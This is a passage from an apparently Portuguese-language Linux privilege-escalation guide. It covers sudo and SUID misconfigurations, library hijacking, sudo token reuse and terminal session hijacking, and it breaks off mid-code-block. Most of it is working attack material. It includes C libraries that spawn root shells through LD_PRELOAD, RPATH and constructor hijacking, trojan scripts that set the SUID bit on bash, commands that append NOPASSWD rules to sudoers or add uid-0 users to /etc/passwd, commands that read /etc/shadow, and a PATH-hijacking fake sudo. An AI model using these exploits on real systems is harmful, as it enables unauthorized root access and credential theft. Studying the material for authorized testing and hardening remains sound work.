Em algumas distribuições mais antigas, o sudo pode ser configurado com `requiretty`, que força o sudo a ser executado somente a partir de um TTY interativo. Se `!requiretty` estiver definido (ou se a opção estiver ausente), o sudo pode ser executado a partir de contextos não interativos, como reverse shells, cron jobs ou scripts.

```bash
Defaults !requiretty
```

Isto não é uma vulnerabilidade direta por si só, mas amplia as situações em que regras do sudo podem ser abusadas sem precisar de um PTY completo.

### Sudo env_keep+=PATH / secure_path inseguro → PATH hijack

Se `sudo -l` mostrar `env_keep+=PATH` ou um `secure_path` contendo entradas graváveis pelo atacante (por exemplo, `/home/<user>/bin`), um comando externo sem caminho explícito dentro do alvo permitido pelo sudo pode ser substituído por outro.<sup>[[3]](#references)</sup> A ausência de um `secure_path` efetivo também merece análise **se** o ambiente do comando preservar um `PATH` controlado por quem o invoca; a ausência, por si só, não prova que isso ocorra. Leia o script permitido sem executá-lo e, em seguida, verifique a regra exata de RunAs e argumentos, o caminho efetivo de busca de comandos e a existência de um diretório anterior, gravável e percorrível, contendo o nome do comando. Autenticação, `NOEXEC`, comandos internos do shell e caminhos absolutos para os comandos podem alterar o resultado.

- Requisitos: uma regra do sudo (frequentemente `NOPASSWD`) que execute um script/binário que invoque comandos sem caminhos absolutos (`free`, `df`, `ps` etc.) e uma entrada de PATH gravável que seja pesquisada primeiro.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Contornar caminhos na execução via Sudo
**Escape** para ler outros arquivos ou usar **symlinks**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Se um **wildcard** for usado (\*), fica ainda mais fácil:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando sudo/binário SUID sem caminho do comando

Se a **permissão sudo** for concedida para um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você pode explorá-la alterando a variável PATH.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Esta técnica também pode ser usada se um binário **suid** **executar outro comando sem especificar o caminho para ele (sempre verifique o conteúdo de um binário SUID estranho com** _**strings**_**)**.

[Exemplos de payloads para executar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executar outro comando especificando o caminho**, então você pode tentar **exportar uma função** com o nome do comando chamado pelo arquivo suid.

Por exemplo, se um binário suid chamar _**/usr/sbin/service apache2 start**_, você deve tentar criar a função e exportá-la:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Então, quando você chamar o binário suid, esta função será executada

### Wrappers de cópia SUID personalizados

Um utilitário SUID pertencente ao root que aceita caminhos de origem e destino pode cruzar dois limites de confiança diferentes. Se ele montar um comando de shell usando qualquer um dos argumentos (por exemplo, passando um comando `cp` construído para `system()`), metacaracteres do shell poderão executar outro comando com os privilégios efetivos do utilitário. Mesmo que invoque `cp` com segurança, sem usar um shell, um destino irrestrito pode permitir a gravação privilegiada arbitrária em arquivos como `/etc/passwd`. Revise o tratamento dos argumentos pelo wrapper, o comportamento do UID efetivo, as restrições de destino e se o arquivo copiado mantém o conteúdo controlado pelo chamador; um erro genérico de `cp` ou apenas o bit SUID não comprova nenhuma das possibilidades. Enumere o binário e suas permissões passivamente antes de qualquer teste manual.

### Script gravável executado por um wrapper SUID

Uma configuração incorreta comum em aplicativos personalizados é um wrapper binário SUID pertencente ao root que executa um script, enquanto o próprio script pode ser gravado por usuários com poucos privilégios.

Padrão típico:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Se `/usr/local/bin/backup.sh` tiver permissão de escrita, você pode adicionar comandos de payload e, em seguida, executar o wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Verificações rápidas:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Esse caminho de ataque é especialmente comum em wrappers de "maintenance"/"backup distribuídos em `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (arquivos .so) a serem carregadas pelo loader antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como preloading de uma biblioteca.

No entanto, para manter a segurança do sistema e impedir que esse recurso seja explorado, especialmente com executáveis **suid/sgid**, o sistema impõe certas condições:

- O loader ignora **LD_PRELOAD** para executáveis nos quais o ID real do usuário (_ruid_) não corresponde ao ID efetivo do usuário (_euid_).
- Para executáveis com suid/sgid, somente bibliotecas em caminhos padrão que também sejam suid/sgid são carregadas previamente.

A escalação de privilégios pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a declaração **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando comandos são executados com `sudo`, podendo levar à execução de código arbitrário com privilégios elevados.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Salve como **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Em seguida, **compile-o** usando:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Por fim, **escalate privileges** executando

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Um privesc semelhante pode ser explorado se o invasor controlar a variável de ambiente **LD_LIBRARY_PATH**, pois ele controla o caminho em que as bibliotecas serão procuradas.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binário SUID – injeção de .so

Ao encontrar um binário com permissões **SUID** que pareça incomum, é recomendável verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte comando:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Por exemplo, encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugere uma possibilidade de exploração.

Para explorar isso, seria necessário criar um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Este código, depois de compilado e executado, tem como objetivo elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.

Compile o arquivo C acima em um arquivo de objeto compartilhado (.so) com:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Por fim, executar o binário SUID afetado deve acionar o exploit, permitindo um possível comprometimento do sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Agora que encontramos um binário SUID carregando uma biblioteca de uma pasta onde podemos escrever, vamos criar a biblioteca nessa pasta com o nome necessário:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Se você receber um erro como

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você pode **injetar apenas argumentos** em um comando.

O projeto reúne funções legítimas de binários Unix que podem ser abusadas para escapar de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, iniciar shells bind e reverse e facilitar outras tarefas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você puder acessar `sudo -l`, poderá usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra uma forma de explorar alguma regra do sudo.

### Reutilizando tokens do Sudo

Nos casos em que você tem **acesso ao sudo**, mas não sabe a senha, pode escalar privilégios **aguardando a execução de um comando sudo e, em seguida, sequestrando o token da sessão**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilégios:

- Você já tem um shell como usuário "_sampleuser_"
- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token do sudo que permite usar `sudo` sem inserir senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` retorna 0
- `gdb` está acessível (você pode conseguir enviá-lo)

(Você pode habilitar `ptrace_scope` temporariamente com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou permanentemente modificando `/etc/sysctl.d/10-ptrace.conf` e definindo `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token do sudo na sua sessão** (você não obterá automaticamente um shell root; execute `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **de propriedade do root e com setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- O **third exploit** (`exploit_v3.sh`) **criará um arquivo sudoers** que torna os **tokens do sudo eternos e permite que todos os usuários usem sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro dela, poderá usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um token sudo para um usuário e um PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, poderá **obter privilégios sudo** sem precisar saber a senha, fazendo:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Por padrão, esses arquivos **só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você puder **ler** esse arquivo, poderá **obter algumas informações interessantes** e, se puder **escrever** em qualquer arquivo, poderá **escalar privilégios**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Se você tem permissão de escrita, pode abusar dessa permissão.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Outra forma de abusar dessas permissões:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Existem algumas alternativas ao binário `sudo`, como o `doas` do OpenBSD. Lembre-se de verificar sua configuração em `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Se `doas` permitir um editor ou interpretador, verifique escapes no estilo GTFOBins:

```bash
doas vim
:!/bin/sh
```

Uma regra `doas` com privilégios de root para o `dstat` original, baseado em Python, também merece uma análise do caminho dos plugins. O [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) e o [código-fonte](https://github.com/dstat-real/dstat/blob/master/dstat) listam `/usr/share/dstat/` e `/usr/local/share/dstat/` entre os locais para plugins `dstat_*.py`. Se o usuário atual puder gravar em um local realmente usado pela versão instalada e pesquisar nele, um plugin selecionado poderá ser executado com a identidade RunAs do `doas`. Confirme a regra efetiva, a busca de plugins nessa versão, as permissões ou ACLs do diretório e dos diretórios-pai, e se quem invoca pode selecionar um plugin; uma regra `dstat` ou um diretório gravável, por si só, é apenas uma pista. Outras implementações do `dstat` podem usar sistemas de plugins diferentes. Inspecione os metadados passivamente, sem carregar um plugin.

### Sudo Hijacking

Se você sabe que um **usuário costuma se conectar a uma máquina e usa `sudo`** para escalar privilégios, e conseguiu um shell no contexto desse usuário, pode **criar um novo executável `sudo`** que executará seu código como root e, em seguida, o comando do usuário. Depois, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho a `.bash_profile`) para que, quando o usuário executar `sudo`, seu executável `sudo` seja executado.

Observe que, se o usuário usar um shell diferente (que não seja bash), você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc` e `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executar algo como:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteca compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Normalmente, esse arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde as **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema procurará bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta dentro do arquivo de configuração em `/etc/ld.so.conf.d/*.conf`, ele poderá conseguir escalar privilégios.\
Confira **como explorar essa configuração incorreta** na página a seguir:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa nesse local, conforme especificado na variável `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

As capabilities do Linux fornecem a um processo um **subconjunto dos privilégios root disponíveis**. Isso efetivamente divide os **privilégios root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente aos processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a página a seguir para **saber mais sobre capabilities e como abusar delas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Em um diretório, o **bit de "execução"** implica que o usuário afetado pode dar "**cd**" para entrar na pasta.\
O bit de **"leitura"** implica que o usuário pode **listar** os **arquivos**, e o bit de **"escrita"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

As Access Control Lists (ACLs) representam a camada secundária de permissões discricionárias, capazes de **sobrepor as permissões ugo/rwx tradicionais**. Essas permissões aprimoram o controle sobre o acesso a arquivos ou diretórios, permitindo ou negando direitos a usuários específicos que não são os proprietários nem fazem parte do grupo. Esse nível de **granularidade garante um gerenciamento de acesso mais preciso**. Mais detalhes podem ser encontrados [**aqui**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Conceda** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Obtenha** arquivos com ACLs específicas do sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor de ACL oculta em arquivos adicionais do sudoers

Uma configuração incorreta comum é um arquivo pertencente ao root em `/etc/sudoers.d/` com permissões `440` que ainda concede acesso de escrita a um usuário de baixo privilégio por meio de ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Se você encontrar algo como `user:alice:rw-`, o usuário pode adicionar uma regra sudo apesar dos bits de permissão restritivos:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Este é um caminho de persistência/privesc de alto impacto baseado em ACL, pois é fácil não percebê-lo em revisões que usam apenas `ls -l`.

## Sessões de shell abertas

O acesso entre usuários ao GNU Screen depende da **configuração e da ACL da sessão em execução**, não apenas da versão. [A documentação do GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) informa que ele precisa ser compilado com suporte multiusuário; `multiuser on` e uma permissão concedida por `acladd` ou por um `aclchg` adequado permitem que outro usuário se conecte. [O manual também exige setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) para a busca entre usuários da sessão. Um socket visível pertencente ao root ou apenas um binário `screen` com SUID não comprovam que seja possível conectar-se a um shell root. Antes de considerar isso uma escalada, confirme que a sessão ativa é multiusuário, que o usuário atual tem permissão efetiva para inserir comandos ou controlar a sessão e que o shell nessa sessão é executado como o proprietário privilegiado.

### Sequestro de sessões do screen

**Listar sessões do screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![sequestro de sessões do screen - Localizações dos sockets (alguns sistemas expõem um como link simbólico do outro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Anexar a uma sessão**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Isso era um problema em **versões antigas do tmux**. Não consegui fazer hijack de uma sessão do tmux (v2.1) criada pelo root como usuário sem privilégios.

**Listar sessões do tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Localizações dos sockets (alguns sistemas expõem um como link simbólico do outro) - hijacking de sessões tmux: tmux -S /tmp/dev sess ls Liste usando esse socket; você pode iniciar uma sessão tmux nesse socket...](<../../images/image (837).png>)

**Anexar-se a uma sessão**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Confira a box Valentine do HTB para ver um exemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Chaves geradas com versões afetadas do OpenSSL do Debian ou de distribuições derivadas durante o período vulnerável histórico podem ter aleatoriedade previsível; a distribuição atual do host ou uma versão corrigida do OpenSSL não determina como uma chave antiga foi gerada. Verifique a **chave específica** em uma lista de bloqueio histórica adequada e confira sua origem. O [manual do `ssh-vulnkey` do Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) descreve como verificar chaves públicas e `authorized_keys`, e [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) registra a correção do OpenSSL. Uma entrada no arquivo `authorized_keys` de uma conta privilegiada só é uma pista de escalada se a chave privada correspondente puder ser recuperada e a política SSH efetiva ainda aceitar essa chave para a conta; uma chave de **host** fraca não é, por si só, uma credencial de login. Substitua as chaves comprometidas e remova as autorizações antigas.

### Valores de configuração interessantes do SSH

- **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão upstream do OpenSSH é `yes`; a configuração da distribuição pode substituí-lo.
- **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando a autenticação por senha é permitida, especifica se o servidor permite login em contas com senhas vazias. O padrão é `no`.

### Arquivos de controle de login

Estes arquivos influenciam quem pode fazer login e como:

- **`/etc/nologin`**: se existir, bloqueia logins de usuários que não sejam root e exibe sua mensagem.
- **`/etc/securetty`**: restringe onde root pode fazer login (lista de permissões de TTY).
- **`/etc/motd`**: banner exibido após o login (pode revelar detalhes do ambiente ou de manutenção).

### PermitRootLogin

Especifica se root pode fazer login usando SSH. O padrão upstream do OpenSSH é `prohibit-password`; a configuração da distribuição pode substituí-lo. Valores possíveis:

- `yes`: root pode fazer login usando senha e chave privada
- `without-password` ou `prohibit-password`: root só pode fazer login com uma chave privada
- `forced-commands-only`: root só pode fazer login usando uma chave privada e se as opções de comandos forem especificadas
- `no` : não

### Autoridades certificadoras de certificados de usuário SSH confiáveis

`TrustedUserCAKeys` especifica as chaves públicas em que o sshd confia para assinar certificados de **usuário**. Se a chave privada da CA correspondente puder ser lida por um usuário com menos privilégios, verifique quem pode obter um certificado e com quais principais de conta ele poderia se autenticar. `AuthorizedPrincipalsFile` ou `AuthorizedPrincipalsCommand` podem restringir os nomes aceitos; se nenhum deles estiver configurado, o certificado deve conter o nome da conta de destino. `PermitRootLogin prohibit-password` bloqueia a autenticação de root por senha, mas ainda pode permitir a autenticação por certificado. A existência de um caminho para a chave exposta, por si só, não comprova acesso: confirme o par de chaves pública/privada, as regras `Match` efetivas, a política da conta, a frase secreta da chave, a revogação e os algoritmos de assinatura aceitos. Não inclua os bytes de chaves privadas na saída da enumeração. Consulte o [manual de configuração do servidor OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Uma chave privada de CA também pode ser usada **sem estar legível** para o usuário atual se uma regra de delegação de privilégios permitir que esse usuário execute um [assinador de certificados irrestrito, como `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), sob a identidade do proprietário da chave. Correlacione o comando e os argumentos exatos permitidos com o acesso do usuário assinador à chave, a CA pública confiável pela configuração efetiva do sshd, o principal aceito para a conta de destino, a validade do certificado e a política de login dessa conta. Um comando de assinatura delegado ou um arquivo de CA confiável, isoladamente, não comprova acesso a outra conta; não assine um certificado de teste durante a enumeração passiva.

### AuthorizedKeysFile

Especifica os arquivos que contêm as chaves públicas que podem ser usadas para autenticação do usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório pessoal. **É possível indicar caminhos absolutos** (iniciados por `/`) ou **caminhos relativos ao diretório pessoal do usuário**. Por exemplo:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Essa configuração indicará que, se você tentar fazer login com a chave **privada** do usuário "**testusername**", o SSH comparará a chave pública da sua chave com as que estão em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

O encaminhamento do agente SSH permite **usar suas chaves SSH locais em vez de deixar as chaves** (sem frases-senha!) no seu servidor. Assim, você poderá se conectar via SSH **a um host** e, de lá, **conectar-se a outro host usando** a **chave** armazenada no seu **host inicial**.

Você precisa definir essa opção em `$HOME/.ssh.config` assim:

```
Host example.com
  ForwardAgent yes
```

Observe que, se `Host` for `*`, sempre que o usuário se conectar a outra máquina, ela poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você encontrar o Forward Agent configurado em um ambiente, consulte a página a seguir, pois **talvez você possa abusar dele para escalar privilégios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Arquivos interessantes

### Arquivos de perfil

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Se algum script de perfil estranho for encontrado, você deve verificar se ele contém **detalhes confidenciais**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem ter outro nome ou pode haver um backup. Portanto, recomenda-se **encontrar todos eles** e **verificar se você consegue lê-los** para ver **se há hashes** nos arquivos:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Em algumas ocasiões, você pode encontrar **hashes de senhas** no arquivo `/etc/passwd` (ou equivalente)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Em seguida, adicione o usuário `hacker` e defina a senha gerada.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Ex.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Como alternativa, você pode usar as linhas a seguir para adicionar um usuário fictício sem senha.\
AVISO: você pode comprometer a segurança atual da máquina.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTA: Nas plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`; além disso, `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, consegue escrever em algum **arquivo de configuração de serviço**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** poderá modificar as linhas:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Your backdoor será executado na próxima vez que o tomcat for iniciado.

### Verifique as pastas

As seguintes pastas podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Localizações incomuns/arquivos de propriedade

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
